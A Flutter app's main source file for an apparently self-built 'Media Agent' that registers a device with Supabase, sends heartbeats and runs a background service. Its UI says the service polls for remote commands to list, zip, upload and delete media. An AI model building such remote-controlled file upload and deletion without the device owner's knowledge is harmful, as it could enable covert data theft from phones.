// lib/main.dart
import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/widgets.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

import 'core/device_agent.dart';

/// ======================
/// CONFIG (SAFE TO SHIP)
/// ======================
/// ⚠️ NEVER use service_role key in client
const int HEARTBEAT_INTERVAL_SECONDS = 30;

const String SUPABASE_PROJECT_URL =
    'https://pbovhvhpewnooofaeybe.supabase.co';

const String SUPABASE_ANON_KEY =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBib3ZodmhwZXdub29vZmFleWJlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjY0MTIsImV4cCI6MjA4MTc0MjQxMn0.5MotbwR5oS29vZ2w-b2rmyExT1M803ImLD_-ecu2MzU';

/// Edge Function recommended (uses service_role on server)
const String SUPABASE_REGISTER_FUNCTION =
    '$SUPABASE_PROJECT_URL/functions/v1/register-device';

final Uuid _uuid = const Uuid();

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MediaAgentApp());
}

/// ===============================
/// HEADLESS BACKGROUND ENTRYPOINT
/// ===============================
/// Called by Android foreground/background service
@pragma('vm:entry-point')
void backgroundMain() {
  WidgetsFlutterBinding.ensureInitialized();
  _startBackgroundAgent();
}

@pragma('vm:entry-point')
Future<void> _startBackgroundAgent() async {
  try {
    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_PROJECT_URL,
      anonKey: SUPABASE_ANON_KEY,
      pollInterval: const Duration(seconds: 5),
      registerUri: Uri.tryParse(SUPABASE_REGISTER_FUNCTION),
    );

    await DeviceAgent.instance.start();

    // heartbeat (best-effort, non-blocking)
    unawaited(DeviceAgent.instance.sendHeartbeat());

    debugPrint('[BG] DeviceAgent started');
  } catch (e, st) {
    debugPrint('[BG] Failed to start agent: $e\n$st');
  }
}

/// =================
/// UI APPLICATION
/// =================
class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String _status = 'Initializing...';
  String? _deviceId;
  String? _deviceJwt;

  Timer? _heartbeatTimer;
  bool _agentRunning = false;

  @override
  void initState() {
    super.initState();
    _initAndStart();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    DeviceAgent.instance.stop();
    super.dispose();
  }

  /// -----------------
  /// INITIALIZATION
  /// -----------------
  Future<void> _initAndStart() async {
    setState(() => _status = 'Loading local state...');
    final prefs = await SharedPreferences.getInstance();

    _deviceId = prefs.getString('device_id');
    _deviceJwt = prefs.getString('device_jwt');

    // Generate stable device ID once
    if (_deviceId == null) {
      _deviceId = _uuid.v4();
      await prefs.setString('device_id', _deviceId!);
    }

    setState(() => _status = 'Configuring agent...');

    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_PROJECT_URL,
      anonKey: SUPABASE_ANON_KEY,
      deviceId: _deviceId,
      deviceJwt: _deviceJwt,
      pollInterval: const Duration(seconds: 5),
      registerUri: Uri.tryParse(SUPABASE_REGISTER_FUNCTION),
    );

    setState(() => _status = 'Starting agent...');
    await DeviceAgent.instance.start();

    _agentRunning = true;
    _startHeartbeat();

    // Reload credentials (in case auto-register happened)
    final prefs2 = await SharedPreferences.getInstance();
    setState(() {
      _deviceId = prefs2.getString('device_id');
      _deviceJwt = prefs2.getString('device_jwt');
      _status = 'Agent running';
    });
  }

  /// -----------------
  /// HEARTBEAT
  /// -----------------
  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    DeviceAgent.instance.sendHeartbeat();

    _heartbeatTimer = Timer.periodic(
      const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
      (_) => DeviceAgent.instance.sendHeartbeat(),
    );
  }

  /// -----------------
  /// CONTROLS
  /// -----------------
  Future<void> _manualRegister() async {
    setState(() => _status = 'Registering device...');
    try {
      final res = await DeviceAgent.instance.registerDeviceViaEdge(
        registerUri: Uri.parse(SUPABASE_REGISTER_FUNCTION),
        requestedId: _deviceId!,
        displayName: 'Android Media Agent',
        consent: true,
        metadata: {'source': 'manual_ui'},
      );

      if (res != null) {
        final prefs = await SharedPreferences.getInstance();
        setState(() {
          _deviceId = prefs.getString('device_id');
          _deviceJwt = prefs.getString('device_jwt');
          _status = 'Registration successful';
        });
      } else {
        setState(() => _status = 'Registration failed (see logs)');
      }
    } catch (e) {
      setState(() => _status = 'Register error: $e');
    }
  }

  Future<void> _stopAgent() async {
    await DeviceAgent.instance.stop();
    _heartbeatTimer?.cancel();
    setState(() {
      _agentRunning = false;
      _status = 'Agent stopped';
    });
  }

  Future<void> _startAgent() async {
    await DeviceAgent.instance.start();
    _startHeartbeat();
    setState(() {
      _agentRunning = true;
      _status = 'Agent running';
    });
  }

  /// -----------------
  /// UI HELPERS
  /// -----------------
  Widget _infoRow(String label, String? value) {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text('$label: ',
            style: const TextStyle(fontWeight: FontWeight.bold)),
        Expanded(child: Text(value ?? '-')),
      ],
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Media Agent')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(_status),
            const SizedBox(height: 12),
            _infoRow('Device ID', _deviceId),
            const SizedBox(height: 6),
            _infoRow('JWT', _deviceJwt != null ? 'present' : 'missing'),
            const SizedBox(height: 16),
            const Text(
              'Background agent polling Supabase commands and executing '
              'media operations (list / zip / upload / delete).',
            ),
            const SizedBox(height: 16),
            Row(
              children: [
                ElevatedButton(
                  onPressed: _manualRegister,
                  child: const Text('Manual register'),
                ),
                const SizedBox(width: 12),
                ElevatedButton(
                  onPressed: _agentRunning ? _stopAgent : _startAgent,
                  child: Text(_agentRunning ? 'Stop agent' : 'Start agent'),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}
